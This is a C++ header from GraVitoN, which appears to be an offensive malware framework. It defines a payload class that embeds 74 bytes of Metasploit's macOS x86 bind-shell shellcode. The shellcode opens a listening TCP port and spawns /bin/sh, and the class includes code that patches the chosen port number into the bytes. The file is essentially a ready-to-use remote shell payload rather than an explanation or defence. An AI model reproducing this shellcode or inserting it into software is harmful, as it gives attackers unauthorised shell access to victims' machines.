/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief OSX_MSF_Shell_Bind_32
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_OSX_MSF_Shell_Bind_32_H_
#define _GVN_OSX_MSF_Shell_Bind_32_H_

#include <payload/payload.hpp>

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <errno.h>

namespace GraVitoN
{

namespace Payload
{

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief OSX 32bit Bind Shell
 *
 * @see Payload_Sample
 */
class OSX_MSF_Shell_Bind_32 : public GraVitoN::Payload::Binary_Payload
{
private:
    unsigned int port;

protected:
	virtual bool initPayload();

public:
    OSX_MSF_Shell_Bind_32();
    virtual ~OSX_MSF_Shell_Bind_32();

    virtual bool initialize ( const unsigned int &bport );
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
OSX_MSF_Shell_Bind_32::OSX_MSF_Shell_Bind_32()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
OSX_MSF_Shell_Bind_32::~OSX_MSF_Shell_Bind_32()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool OSX_MSF_Shell_Bind_32::initPayload()
{	
    /**
    * osx/x86/shell_bind_tcp - 74 bytes \n
    * http://www.metasploit.com \n
    * VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false, \n
    * PrependSetreuid=false, PrependSetuid=false, \n
    * AppendExit=false, InitialAutoRunScript=, AutoRunScript= \n
    */
	
    unsigned char buf[] =
        "\x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02"
        "\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89"
        "\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58"
        "\xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80";
    /// Change port number
	int buf_len = 74;
	
	unsigned char up = port / 256, down = port % 256;
	buf[06] = up;
	buf[07] = down;
	
    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool OSX_MSF_Shell_Bind_32::initialize(const unsigned int &bport)
{
    port = bport;

    Core::Logger::logIt ( "init payload... " );
    initPayload();
    Core::Logger::logItLn ( "done" );

    return true;
}

}
}
#endif // _GVN_OSX_MSF_Shell_Bind_32_H_
